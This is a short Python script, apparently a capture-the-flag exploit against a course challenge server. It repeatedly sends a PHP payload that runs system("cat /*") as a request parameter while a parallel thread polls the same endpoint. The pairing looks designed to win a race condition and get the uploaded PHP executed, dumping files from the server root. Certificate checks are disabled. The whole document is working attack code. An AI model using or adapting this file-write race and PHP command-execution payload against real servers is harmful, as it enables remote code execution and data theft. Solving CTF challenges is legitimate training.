import threading
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
c = """
<?php 
	system("cat /*");
?>
"""
for i in range(0xFFF):
	
	c += str(i)

	def normal():
	
		r = requests.get('https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]='+ "aaa",verify=False)
		if r.content[58] != "a" and r.content[58] != "<" and r.content[58:61] != "ttp":
			print(r.content)

	def content():
		r = requests.get('https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]='+ c,verify=False)

	threading.Thread(target=normal).start()
	threading.Thread(target=content).start()



